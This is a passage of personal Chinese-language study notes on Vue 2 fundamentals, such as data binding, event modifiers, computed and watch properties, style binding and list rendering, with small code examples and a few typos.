# vue

------

## 课程目录

1. vue基础

2. vue-cli (脚手架)

3. vue-router (路由)

4. vuex (保管数据)

5. element-ui (组件库)

6. vue3

   [TOC]

   

## 基本概念

> 一套用于**构建用户界面的渐进式**JavaScript框架

### 渐进式

Vue可以自底向上逐层的应用

简单应用：只需一个轻量小巧的核心库

复杂应用：可以引入各式各样的Vue插件

### Vue的特点

1. 采用**组件化**模式，提高代码复用率、且让代码更好维护。

<img src="C:\Users\22135\AppData\Roaming\Typora\typora-user-images\image-20210814213644881.png" alt="image-20210814213644881" style="zoom:50%;" />

每一个模块都是一个vue文件，复用率高、容易维护

2. **声明式**编码，让编码人员无需直接操作DOM，提高开发效率

![image-20210814214247326](C:\Users\22135\AppData\Roaming\Typora\typora-user-images\image-20210814214247326.png)

**命令式编码和声名式编码的区别**

![image-20210814214317750](C:\Users\22135\AppData\Roaming\Typora\typora-user-images\image-20210814214317750.png)

3. 使用**虚拟DOM+**优秀的**Diff算法**，尽量复用DOM节点 

![image-20210814215030373](C:\Users\22135\AppData\Roaming\Typora\typora-user-images\image-20210814215030373.png)

Vue在实现dom元素的时候会先创建虚拟DOM(Virtual-DOM),然后再由虚拟DOM产生真实DOM(Real-DOM)

一旦有新的数据产生那么就会创建虚拟DOM，再创建的时候发现有相同的虚拟DOM的话就会复用之前的虚拟DOM这个就是Diff算法

没有相同的虚拟DOM会添加到里面然后生成真实的

### 安装vue

我们可以从vue的官网下载vue文件

<img src="C:\Users\22135\AppData\Roaming\Typora\typora-user-images\image-20210815101201837.png" alt="image-20210815101201837" style="zoom: 67%;" />

开发的时候用开发版本，如果项目上线那么可以换成生产版本

### 引入vue.js文件

```javascript
<title>初始vue</title>
<!-- 引入vue.js文件 -->
<script src="../js/vue.js"></script>
<body>
  <script>
  //可以将vue的生产环境提示清除
    Vue.config.productionTip = false;
  </script>
</body>
```

## vue基础

### 第一个vue.js

1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
2. app容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
3. app容器里的代码被称为"Vue模板"
4. Vue实例和容器是一一对应的
5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用
6. {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性
7. 一旦data中的数据发生变化，那么页面中用到该数据的地方也会自动更新

使用vue之前我们需要先准备一个容器，之后我们创建的vue实例会绑定到这个容器

```javascript
...
 <div id="app">
   <h1></h1>//里面的内容不要写死
 </div>
...
```

#### 创建vue实例

```javascript
...
	new Vue({
	  el: "#app",
	  data: {},
	});
...
```

#### el

el用于指定当前的Vue实例为哪个容器服务，值通常是为css选择器**字符串**

```javascript
el: "#app",
```

#### data

data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象

```javascript
data: {
	name:'后盾人',
	age:19
},
```

#### 插值

两个花括号就是Vue特定的语法，里面专门来写vue的代码

```javascript
<div id="root">
  <h1>hello {{ name }}</h1>
  <p>年龄:{{ age }}</p>
</div>
```

#### hello world案例

```javascript
<div id="root">
  <h1>hello {{ name }}</h1>
  <p>年龄:{{ age }}</p>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    //el是用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
    el: "#root",
    data: {
      name: "张三",
      age: 19,
    },
  });
</script>
```

#### 表达式和代码

1. 表达式:一个表达式会产生一个值，可以放在任何一个需要值得地方

```javascript
a
a+b
demo(2)
x===y ? 'a' ? 'b'
```

2. js代码(语句)

```javascript
if(){}
for(){}
```

### 模板语法

Vue模板语法有2大类

#### 1.插值语法

- 功能：用于解析标签体内容
- 写法:`{{xxx}}`,xxx是js表达式，且可以直接读取到data中的所有属性。

```javascript
<div id="root">
  <h1>hello {{ name }}</h1>
  <p>年龄:{{ age }}</p>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    //el是用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
    el: "#root",
    data: {
      name: "张三",
      age: 19,
    },
  });
</script>
```

#### 2.指令语法

- 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件......）
- 举例：v-bind:href="xxx" 或 简写成 :href="xxx",xxx同样要写js表达式，且可以直接读取到data中的所有属性
- 备注：Vue中有很多指令，且形式都是：v-???，此时我们只是拿v-bind举个例子

```javascript
<div id="root">
  <h2>插值语法</h2>
  <p>hello {{ user.name }}</p>
  <h2>指令语法</h2>
  <!-- 指令语法v-bind -->
  <a :href="user.url" :rule="user.message" :name="name">
  点击跳转{{ user.name }} 1</a>
  <a v-bind:href="user.url" v-bind:rule="user.message">
      点击跳转{{ user.name }} 2</a>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#root",
    data: {
      name: "跳转",
      user: {
        name: "后盾人",
        message: "人人做后盾",
        url: "http://www.houdunren.com",
      },
    },
  });
</script>
```

### 数据绑定

Vue中有2中数据绑定的方式：

1. 单项绑定(v-bind):数据只能从data流向页面
2. 双向绑定(v-model):数据不仅能从data流向页面，还可以从页面流向data

备注：

- 双向绑定一般都应用在表单类元素上(如:input、select等)
- v-model:value 可以简写成 v-model,因为v-model默认收集的就是value值

#### 双向数据绑定

```javascript
<div id="app">
  <!-- 单项数据绑定:<input type="text" v-bind:value="name" /><br />
  双向数据绑定:<input type="text" v-model:value="name" /> -->
  <!-- 简写形式 -->
  单项数据绑定:<input type="text" :value="name" /><br />
  双向数据绑定:<input type="text" v-model="name" />
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
    },
  });
```

v-model一般是应用到表单元素有value属性的元素上，下面情况是会报错的

```javascript
<h2 v-model="name"></h2>
```

### data和el的两种写法

#### el

el有两种写法

1. new Vue时候配置el属性
2. 先创建Vue实例，随后再通过vm.$mount('#app')指定el的值。

```javascript
const vm = new Vue({
  data: {
    name: "后盾人",
  },
});
vm.$mount("#app");
```

#### data

data有两种写法

1. 对象式
2. 函数式

如何选择:目前哪种写法都可以，以后学习到组件，data必须使用函数式，否则会报错。

**注意：**

- data函数式里面必须是返回一个对象，对象里面写返回的数据
- 由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了

```javascript
const vm = new Vue({
  data() {
    return {
      name: "后盾人",
    };
  },
});
vm.$mount("#app");
```

### MVVM模型

1. M：模型(model)：对应data中的数据
2. V：视图(View)：模板
3. VM：视图模型(ViewModel)：Vue实例对象

vm就是Vue实例对象，所以我们一般用vm来接受使用对象

![img](https://img-blog.csdnimg.cn/20200829125416137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW5ncWl1bWluZw==,size_16,color_FFFFFF,t_70)

注意：

- data中所有的属性，最后都出现了vm身上。
- vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

### 数据代理

通过一个对象代理对另一个对象中属性的操作（读/写）

下面zs就就代理了hd中的name属性，那么就可以对其进行读取或者修改，同样修改之后hd中的name也会跟着改变

```javascript
const hd = {
  name: "后盾人",
};
const zs = {
  site: "http://houdunren.com",
};
Object.defineProperty(zs, "name", {
  get() {
    return hd.name;
  },
  set(value) {
    hd.name = value;
  },
});
zs.name = "张三";
console.log(zs);
console.log(hd); //name=张三
```

#### Vue中的数据代理

通过vm对象来代理data对象中的属性的操作(读/写)

**带来的好处**

可以更加方便的操作data中的数据

基本原理：

- 通过Ojbect.defineProperty()把data对象中所有属性添加到vm上
- 为每一个添加到vm上的属性，都指定一个getter/setter
- 在getter/setter内部去操作(读/写) data中对应的属性

![image-20210816113805610](C:\Users\22135\AppData\Roaming\Typora\typora-user-images\image-20210816113805610.png)

### 事件处理

#### 事件的基本使用

1. 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件类型名称
2. 事件的回调需要配置在methods对象中，最后会在vm上
3. methods中配置的函数，不要使用箭头函数，否则this是window
4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象
5. @click="demo" 和 @click="demo($event)"效果一致，但后者可以传参
6. @click="$event.target.blur()"是可以将点击之后触发blur的事件

下面使用是最基本的事件使用

```javascript
<div id="app">
  <h2>hello {{ name }}</h2>
  <button v-on:click="show">点击触发事件</button>
  <button @click="user($event,'张三')">点击触发事件 简写</button>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
    },
    methods: {
      show(event) {
        console.log(event.target.innerText);
      },
      user(event, name) {
        console.log(name); //张三
        console.log(this); //vm
      },
    },
  });
</script>
```

在触发事件如果需要传递参数，又需要用到事件对象，那么可以在传递参数的时候用$event占位

传递参数和接受参数的位置是需要一直的

#### v-on:xxx

v-on可以绑定事件也可以简写成@click="xxx"

```javascript
<button v-on:click="show">点击触发事件</button>
```

#### methods

在Vue中定义函数我们可以写在methods这个对象里面，一般都是写在这里

```javascript
new Vue({
  el: "#app",
  data: {
    firstName: "张",
    name: "三",
  },
  methods: {
    getName() {
      return `${this.firstName.slice(0, 2)}-${this.name}`;
    },
  },
});
```



#### 事件修饰符

##### prevent

`$click.prevent='xxx'`可以阻止默认事件行为

下面是阻止a标签的默认行为

```javascript
<div id="app">
  <h2>hello {{ name }}</h2>
  <a href="http://houdunren.com" @click.prevent="show">点击跳转</a>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
    },
    methods: {
      show(event) {
        console.log("houdunren.com");
      },
    },
  });
</script>
```

##### stop

阻止事件冒泡

```javascript
<style>
  * {
    padding: 10px;
  }
  .father {
    height: 50px;
    background: #2ecc71;
  }
  .son {
    height: 30px;
    background: #3498db;
  }
</style>
<body>
	<div id="app">
	  <h2>hello {{ name }}</h2>
	  <div @click="hd" class="father">
	    <div @click.stop="show" class="son"></div>
	  </div>
	</div>
	<script>
	  Vue.config.productionTip = false;
	  new Vue({
	    el: "#app",
	    data: {
	      name: "后盾人",
	    },
	    methods: {
	      show() {
	        console.log("houdunren.com");
	      },
	      hd(event) {
	        console.log("hdcms.com");
	      },
	    },
	  });
	</script>
</body>
```

##### once

事件只可以触发一次

wheel事件是监听鼠标的滚轮事件而不是滚动条

```javascript
<style>
  * {
    padding: 10px;
  }
  .list {
    height: 50px;
    background: #3498db;
    overflow: auto;
    list-style: none;
  }
</style>
head>
ody>
<div id="app">
  <h2>hello {{ name }}</h2>
  <ul class="list" @wheel.once="show">
    <li>houdunren.com</li>
    <li>houdunren.com</li>
    <li>houdunren.com</li>
    <li>houdunren.com</li>
  </ul>
  <button @click.once="hd">只能触发一次事件</button>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
    },
    methods: {
      show() {
        console.log("houdunren.com");
      },
      hd(event) {
        console.log("hdcms.com");
      },
    },
  });
</script>
```

##### capture

使用事件的捕获模式

```javascript
<style>
   * {
     padding: 10px;
   }
   .father {
     height: 50px;
     background: #2ecc71;
   }
   .son {
     height: 30px;
     background: #3498db;
   }
 </style>
 <body>
   <div id="app">
     <h2>hello {{ name }}</h2>
     <div @click.capture="hd" class="father">
       <div @click="show" class="son"></div>
     </div>
   </div>
   <script>
     Vue.config.productionTip = false;
     new Vue({
       el: "#app",
       data: {
         name: "后盾人",
       },
       methods: {
         show() {
           console.log("houdunren.com");
         },
         hd(event) {
           console.log("hdcms.com");
         },
       },
     });
   </script>
 </body>
```

##### self

只有event.target是当前操作的元素时才会触发事件

##### passvie

事件的默认行为立即执行，无需等待事件回调完毕

#### 键盘事件

##### 按键别名

| 功效 |              键名              |
| :--: | :----------------------------: |
| 删除 |  delete(捕获"删除"和"退格键")  |
| 退出 |              esc               |
| 回车 |             enter              |
| 换行 | tab(特殊，必须配合keydown使用) |
|  上  |               up               |
|  下  |              down              |
|  左  |              left              |
|  右  |             right              |

##### 未定义的按键

Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为caps-lock（短横线命名）

```javascript
<input type="text" @keyup.caps-lock="show" placeholder="请输入用户名" />
```

也可以使用keyCode去制定具体的按键（不推荐）

```javascript
<input type="text" @keyup.13="show" placeholder="请输入用户名" />
```

##### 系统修饰键

ctrl、alt、shift、mate

1. 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
2. 配合keydow使用：正常触发事件

##### 自定义键名

可以通过键码自定义按键别名

```javascript
Vue.config.keyCodes.huiche = 13;
```

##### 小技巧

1. 如果想指定组合键那么可以在一个别名后面再跟别名

下面就是只有在按下ctrl+y的时候才会触发事件

```javascript
<input type="text" @keydown.ctrl.y="show" placeholder="请输入用户名" />
```

2. 如果是同时要操作两个修饰符的时候可以在一个修饰符的后面加点然后跟着写需要的修饰符

如下面例子中既要阻止默认行为又要阻止事件冒泡

```javascript
<style>
  * {
    padding: 10px;
  }
  .father {
    height: 50px;
    background: #2ecc71;
  }
  .son {
    height: 30px;
    background: #3498db;
  }
</style>
<body>
  <div id="app">
    <h2>hello {{ name }}</h2>
    <div @click="hd" class="father">
      <!-- <div @click="show" class="son"></div> -->
      <a @click.prevent.stop="hd" href="http://houdunren.com">点击跳转页面</a>
    </div>
  </div>
  <script>
    Vue.config.productionTip = false;
    new Vue({
      el: "#app",
      data: {
        name: "后盾人",
      },
      methods: {
        show() {
          console.log("houdunren.com");
        },
        hd(event) {
          console.log("hdcms.com");
        },
      },
    });
  </script>
</body>
```

### 姓名案例

下面是使用插值语法的方式，但是插值里面最好是只写简单的表达式

如果我们要对渲染的数据进行处理的话不建议使用普通插值

```javascript
<div id="app">
  <p>姓: <input type="text" v-model:value="firstName" /></p>
  <p>名: <input type="text" v-model:value="name" /></p>
  <p>姓名: <span>{{ firstName.slice(0,2) }}-{{ name }}</span></p>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      firstName: "张",
      name: "三",
    },
  });
</script>
```

下面是使用methods方法返回处理完成的值

注意这里调用函数需要加小括号不然的话渲染的就是整个函数体

```javascript
<div id="app">
  <p>姓: <input type="text" v-model:value="firstName" /></p>
  <p>名: <input type="text" v-model:value="name" /></p>
  <p>姓名: <span>{{ getName() }}</span></p>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      firstName: "张",
      name: "三",
    },
    methods: {
      getName() {
        return `${this.firstName.slice(0, 2)}-${this.name}`;
      },
    },
  });
</script>
```

### 计算属性

1. 定义：要用得属性不存在，要通过已有属性计算得来。
2. 原理：底层借助了Object.defineProperty方法提供得getter和setter
3. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便
4. 备注：

- 计算属性最后会出现在vm上，直接读取使用即可
- 如果计算属性要被修改，那必须写set函数去响应修改，且set中药引起计算时依赖的数据发生变化

#### computed

计算属性要写在computed对象中

一个计算属性对应一个配置对象，配置对象中写getter/setter

```javascript
new Vue({
  el: "#app",
  data: {
    name: "houdunren.com",
  },
  computed: {
    getName: {
      get() {
        return this.name;
      },
    },
  },
});
```



#### get函数

在计算属性中get函数在初次读取时会执行一次

当依赖得数据发生变化时会再次被调用

下面案例中即便是多次调用了计算属性，但还是只会打印一次：执行了get，因为是有缓存得原因

```javascript
<div id="app">
      <h2>姓名:{{ getName }}</h2>
      <h2>姓名:{{ getName }}</h2>
      <h2>姓名:{{ getName }}</h2>
      <h2>姓名:{{ getName }}</h2>
      <h2>姓名:{{ getName }}</h2>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
    },
    //计算属性
    computed: {
      getName: {
        get() {
          console.log("执行了get");
          return this.name;
        },
      },
    },
  });
</script>
```

下面是使用计算属性写得姓名案例

```javascript
<div id="app">
  <p>姓: <input type="text" v-model:value="firstName" /></p>
  <p>名: <input type="text" v-model:value="name" /></p>
  <p>姓名: <span>{{ fullName }}</span></p>
  <p>姓名: <span>{{ fullName }}</span></p>
  <p>姓名: <span>{{ fullName }}</span></p>
</div>
<script>
  Vue.config.productionTip = false;
  const vm = new Vue({
    el: "#app",
    data: {
      firstName: "张",
      name: "三",
    },
    computed: {
      fullName: {
        get() {
          return `${this.firstName}-${this.name}`;
        },
        set(value) {
          const arr = value.split("-");
          this.firstName = arr[0].slice(0, 2);
          this.name = arr[1];
        },
      },
    },
  });
</script>
```

如果确认只需要获取计算属性而不需要修改得时候是可以简写得

```javascript
<div id="app">
  <p>姓: <input type="text" v-model:value="firstName" /></p>
  <p>名: <input type="text" v-model:value="name" /></p>
  <p>姓名: <span>{{ fullName }}</span></p>
</div>
<script>
  Vue.config.productionTip = false;
  const vm = new Vue({
    el: "#app",
    data: {
      firstName: "张",
      name: "三",
    },
    computed: {
      //简写形式
      fullName() {
        return `${this.firstName}-${this.name}`;
      },
    },
  });
</script>
```

简写形式在插值语法中也是不需要加括号

### 天气案例

点击按钮切换天气

```javascript
<div id="app">
  <h2>今天的天气很{{ info }}</h2>
  <button @click="isHot = !isHot">切换天气</button>
</div>
<script>
  Vue.config.productionTip = false;
  const vm = new Vue({
    el: "#app",
    data: {
      isHot: true,
    },
    computed: {
      info() {
        return this.isHot ? "炎热" : "寒冷";
      },
    },
  });
</script>
```

**注意点：**

1. 当我们的数据页面上没有一个元素依赖的时候，如果我们去触发事件修改元素，那么在我们的Vue开发者工具上面是不会去修改的，因为它认为页面上没有改变的东西，那自己也不需要修改
2. 绑定事件的时候，如果执行的回调函数只有一条简单的语句是可以简写的，但如果是多条那么不建议但是不会报错

```javascript
<button @click="isHot = !isHot">切换天气</button>
```

### 监视属性

#### watch

1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
2. 监视的属性必须存在，才能进行监视，如果不存在还是会执行函数但是没有新旧值

new Vue的时候传入watch配置

```javascript
const vm = new Vue({
  el: "#app",
  data: {
    isHot: true,
  },
  computed: {
    info() {
      return this.isHot ? "炎热" : "寒冷";
    },
  },
  watch: {
    info: {
      immediate:true,
      handler(newValue, oldValue) {
        console.log("isHot发生了变化", newValue, oldValue);
      },
    },
  },
});
```

通过vm.$watch监视

```javascript
vm.$watch("isHot", {
  handler(newValue, oldValue) {
    console.log("isHot发生了变化", newValue, oldValue);
  },
});
```

#### handler

handler是watch中的配置项，可以接受两个参数，第一个参数是改变之后的值，第二个是之前的值

注意：监听的属性名可以写计算属性的名字

```javascript
监听的属性名: {
  handler(newValue, oldValue) {
    console.log("监听的属性发生了变化", newValue, oldValue);
  },
},
```

#### immediate

该属性是watch中的配置项,本身handler监听中只有在监视对象的值发生变化的时候才会触发函数，如果加上immediate:true，那么在初始化的时候就会执行一次

```javascript
watch: {
  info: {
    immediate: true,//immediate
    handler(newValue, oldValue) {
      console.log("isHot发生了变化", newValue, oldValue);
    },
  },
},
```

#### 深度监视

1. Vue中的watch默认不监视对象内部值得变化（一层）
2. 配置deep：true可以检测对象内部值改变（多层）

下面案例再number中任何一个数据发生变化得时候都会执行handler函数

如果要监视number对象中得具体一个值得变化那么可以使用number.x，但是必须要使用引号包裹

```javascript
new Vue({
  el:"#app",
  data:{
    number:{
      a:1,
      b:2
    }
  }
})
watch: {
  number: {
    deep: true,
    handler(newValue, oldValue) {
      console.log("number发生了变化");
    },
  }
/*"number.a": {
    deep: true,
    handler(newValue, oldValue) {
      console.log("a发生了变化");
    },
  }*/
},
```

备注：

1. Vue自身可以检测对象内部值得改变，但Vue提供得watch默认不可以
2. 使用watch时根据数据得具体结构，决定是否采用深度监视
3. 深度监视如果监视的值是引用类型，那么心值和旧值是一致的，因为他们是公用的一个内存地址，可以提前将旧值进行拷贝

#### 简写

watch中如果配置项只需要设置handler不需要设置其他的那么可以简写

注意点：如果写成箭头函数那么this将不再指向vm，而是widnow

```javascript
watch: {
  // 不简写可以添加除handler之外的配置项
  info: {
    immediate: true,
    handler(newValue, oldValue) {
      console.log("isHot发生了变化", newValue, oldValue);
    },
  },
  // 简写只能写handler里面的配置
  info(newValue, oldValue) {
    console.log("isHot发生了变化", newValue, oldValue);
  },
},
```

在vm.$watch中也可以简写

```javascript
vm.$watch("info", (newValue, oldValue) => {
  console.log("isHot发生了变化", newValue, oldValue);
});
```

### computed与watch的区别

1. computed能完成的功能，watch都可以完成
2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作
   - computed只有当页面数据变化时才会计算，当数据没有变化时，它会读取缓存。而watch每次都需要执行函数，methods也是每次都需要执行
   - 数据变化时执行异步操作，这个时候使用watch是合适的

#### 两个重要的原则

1. 被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象
2. 所有不被Vue管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm或组件实例对象

下面是watch使用异步

```javascript
<div id="app">
  <p>姓: <input type="text" v-model:value="firstName" /></p>
  <p>名: <input type="text" v-model:value="name" /></p>
  <p>姓名: <span>{{ fullName }}</span></p>
</div>
<script>
  Vue.config.productionTip = false;
  const img = document.querySelector("img");
  const vm = new Vue({
    el: "#app",
    data: {
      firstName: "张",
      name: "三",
      fullName: `张-三`,
    },
    watch: {
      firstName(value) {
        setTimeout(() => {
          this.fullName = `${value.slice(0, 2)}-${this.name}`;
        }, 1000);
      },
      name(value) {
        setTimeout(() => {
          this.fullName = `${this.firstName}-${value}`;
        }, 1000);
      },
    },
  });
</script>
```

下面是computed，如果使用定时器回调的话那么将会返回给这个回调函数

```javascript
<div id="app">
  <p>姓: <input type="text" v-model:value="firstName" /></p>
  <p>名: <input type="text" v-model:value="name" /></p>
  <p>姓名: <span>{{ fullName }}</span></p>
</div>
<script>
  Vue.config.productionTip = false;
  const img = document.querySelector("img");
  const vm = new Vue({
    el: "#app",
    data: {
      firstName: "张",
      name: "三",
    },
    computed: {
      fullName() {
        return `${this.firstName}-${this.name}`;
      },
      /*fullName() {
        setTimeout(() => {
          return `${this.firstName}-${this.name}`; 将会返回给定时器的回调函数
        }, 1000);
      },*/
    },
  });
</script>
```

### 绑定样式

#### 绑定class样式

##### 案例默认样式

这个样式是下面案例公用的样式

```javascript
<style>
  body {
    display: flex;
    flex-direction: column;
    justify-content: space-around;
    align-items: center;
  }
  .init {
    width: 200px;
    height: 200px;
    line-height: 200px;
    text-align: center;
    border: solid 2px #9b59b6;
    transition: all 0.5s;
    color: #e74c3c;
    font-size: 30px;
    cursor: pointer;
  }
  .happy {
    background: #2ecc71;
  }
  .unhappy {
    background: #2c3e50;
  }
  .normal {
    background: #95a5a6;
  }
  .show1 {
    text-shadow: 0 0 5px black;
  }
  .show2 {
    box-shadow: 0 0 5px black;
  }
  .show3 {
    border-radius: 10px;
  }
</style>
```

##### 字符串写法

下面是采用:class="xxx"绑定class属性然后利用字符串修改

适用于：样式的类名不确定，需要动态指定

```javascript
<div id="app">
  <div @click="changeClass" :class="mood" class="init">{{ name }}</div>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
      mood: "normal",
    },
    methods: {
      changeClass() {
        this.mood = "happy";
      },
    },
  });
</script>
```

下面是修改为从3种样式中随机选择一个

```javascript
methods: {
  changeClass() {
    const arr = ["happy", "unhappy", "normal"];
    const random = Math.floor(Math.random() * arr.length);
    this.mood = arr[random];
  },
},
```

##### 数组写法

下面是采用数组的形式添加多个样式

适用于：要绑定的样式个数不确定、名字也不确定

```javascript
<div id="app">
  <div @click="changeClass" :class="mood" class="init">{{ name }}</div>
  <div :class="moods" class="init">{{ name }}</div>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
      mood: "normal",
      moods: ["show1", "show2", "show3"],
    },
    methods: {
      changeClass() {
        const arr = ["happy", "unhappy", "normal"];
        const random = Math.floor(Math.random() * arr.length);
        this.mood = arr[random];
      },
    },
  });
</script>
```

##### 对象写法

下面是采用对象形式的写法

适用于：要绑定的样式个数确定、名字也确定，但是要动态决定用不用

对象中的key放到class中就是类名，而后面可以跟着布尔值，true|false可以决定是否使用该类名

```javascript
<div id="app">
  <div @click="changeClass" :class="mood" class="init">字符串{{ name }}</div>
  <div :class="moods" class="init">数组{{ name }}</div>
  <div :class="moodsObj" class="init">对象{{ name }}</div>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "形式",
      mood: "normal",
      moods: ["show1", "show2", "show3"],
      moodsObj: {
        show1: false,//不使用
        show2: true,//使用
      },
    },
    methods: {
      changeClass() {
        const arr = ["happy", "unhappy", "normal"];
        const random = Math.floor(Math.random() * arr.length);
        this.mood = arr[random];
      },
    },
  });
</script>
```

#### 绑定style内联样式

##### 基础语法

`:style="{fontSize:动态值的名字}"`,因为style中是key，value的类型，所以要写成对象形式的，key必须是样式名，如果中间有段横杠隔开那么可以采用驼峰命名法

下面是把样式写成对象放到data中然后放到页面去解析

```javascript
<style>
  body {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
  }
  .init {
    margin: 10px 0;
    width: 200px;
    height: 200px;
    line-height: 200px;
    text-align: center;
    border: solid 2px #9b59b6;
    transition: all 0.5s;
    color: #e74c3c;
    font-size: 30px;
    cursor: pointer;
  }
  .happy {
    background: #2ecc71;
  }
  .unhappy {
    background: #2c3e50;
  }
  .normal {
    background: #95a5a6;
  }
  .show1 {
    text-shadow: 0 0 5px black;
  }
  .show2 {
    background: #2ecc71;
    box-shadow: 0 0 5px black;
  }
  .show3 {
    border-radius: 10px;
  }
</style>
<div id="app">
  <div class="init" :style="size">内联{{ name }}</div>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "形式",
      size: {
        fontSize: "40px",
        color: "red",
      },
    },
  });
</script>
```

如果有多个样式对象要一起使用，那么可以按照下方这么写

```javascript
<div id="app">
  <div class="init" :style="[fontStyle,background]">内联{{ name }}</div>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "形式",
      // font类型样式
      fontStyle: {
        fontSize: "40px",
        color: "red",
      },
      // 元素背景样式
      background: {
        backgroundColor: "#2ecc71",
      },
    },
  });
</script>
```

### 条件渲染

#### v-show和v-if指令

##### v-if

适用于：切换频率较低的场景

特点：不展示的DOM元素直接被移除

注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被"打断"

不可以单独使用else和else-if，else不需要再写条件

```javascript
<div id="app">
  <h2>hello {{ name }}</h2>
  <h3>{{ n }}</h3>
  <button @click="n++">点击加1</button>
  <div v-if="n==1">Angular</div>
  <div v-else-if="n==2">React</div>
  <div v-else-if="n==3">Vue</div>
  <div v-else>houdunren.com</div>
	//错误示范
  <div v-if="n==1">Angular</div>
	<div>我是后盾人</div>
  <div v-else-if="n==2">React</div>
</div>
<script>
  Vue.config.productionTip = false;
  new Vue({
    el: "#app",
    data: {
      name: "后盾人",
      n: 0,
    },
  });
</script>
```

##### v-show

写法：v-show="表达式"

适用于：切换频率较高的场景

特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

```javascript
<div id="app">
  <h2>hello {{ name }}</h2>
  <h3>{{ n }}</h3>
  <div v-show="false">隐藏</div>
  <div v-show="true">显示</div>
</div>
```

使用v-if的时候元素可能获取不到，但是使用v-show的时候可以获取得到

### 列表渲染

#### v-for指令

用于展示列表数据

语法：v-for="(item, index) in xxx" :key="yyy"

可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```javascript
<div id="root">
	<!-- 遍历数组 -->
	<h2>人员列表（遍历数组）</h2>
	<ul>
		<li v-for="(p,index) of persons" :key="index">
			{{p.name}}-{{p.age}}
		</li>
	</u
	<!-- 遍历对象 -->
	<h2>汽车信息（遍历对象）</h2>
	<ul>
		<li v-for="(value,k) of car" :key="k">
			{{k}}-{{value}}
		</li>
	</u
	<!-- 遍历字符串 -->
	<h2>测试遍历字符串（用得少）</h2>
	<ul>
		<li v-for="(char,index) of str" :key="index">
			{{char}}-{{index}}
		</li>
	</ul>

	<!-- 遍历指定次数 -->
	<h2>测试遍历指定次数（用得少）</h2>
	<ul>
		<li v-for="(number,index) of 5" :key="index">
			{{index}}-{{number}}
		</li>
	</ul>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
	new Vue({
		el:'#root',
		data:{
			persons:[
				{id:'001',name:'张三',age:18},
				{id:'002',name:'李四',age:19},
				{id:'003',name:'王五',age:20}
			],
			car:{
				name:'奥迪A8',
				price:'70万',
				color:'黑色'
			},
			str:'hello'
		}
	})
</script>
```

#### key的原理

**虚拟dom中key的作用**

key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】,随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：

​     ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！

​     ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

(2).旧虚拟DOM中未找到与新虚拟DOM相同的key

​     创建新的真实DOM，随后渲染到到页面。

#### index

1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:

会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

 2. 如果结构中还包含输入类的DOM：

会产生错误DOM更新 ==> 界面有问题。

#### 如何使用key

1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。

2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

```javascript
<div id="root">
	<!-- 遍历数组 -->
	<h2>人员列表（遍历数组）</h2>
	<button @click.once="add">添加一个老刘</button>
	<ul>
		<li v-for="(p,index) of persons" :key="index">
			{{p.name}}-{{p.age}}
			<input type="text">
		</li>
	</ul>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
	new Vue({
		el: '#root',
